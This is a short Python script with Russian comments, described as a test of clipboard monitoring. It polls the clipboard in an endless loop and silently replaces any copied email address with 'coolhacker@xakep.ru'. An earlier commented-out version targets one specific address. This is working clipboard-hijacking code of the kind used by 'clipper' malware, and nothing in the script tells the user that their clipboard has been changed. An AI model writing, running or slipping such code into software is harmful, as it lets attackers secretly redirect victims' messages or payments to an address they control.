# "cridd@mail.ru" - почтовый адрес для теста по мониторингу буфера
# обмена и замене содержимого, если скопирован эелектронный адрес

# import pyperclip
# old = ''
# new_old = ''

# while True:
#     s = pyperclip.paste()
#     if s == "cridd@mail.ru":
#         pyperclip.copy('coolhacker@xakep.ru')
#         new_s = pyperclip.paste()
#         if new_s != s:
#             print(new_s)
#             s = new_s
#             new_old = new_s
#     else:
#         if s != old:
#             if s != new_old:
#                 print(s)
#                 old = s



import re
import pyperclip
old = ""
c = re.compile(r'([A-Za-z0-9]+[.-_])*[A-Za-z0-9]+@[A-Za-z0-9-]+(\.[A-Z|a-z]{2,})+')

while True:
    s = pyperclip.paste()
    if re.fullmatch(c, s):
        pyperclip.copy('coolhacker@xakep.ru')
        s = pyperclip.paste()
        if s !=old:
            print(s)
            old = s
            print("парам-пам-пам...")
        
    else:
        if s != old:
            print(s, "- Это не email")
        old = s
        
    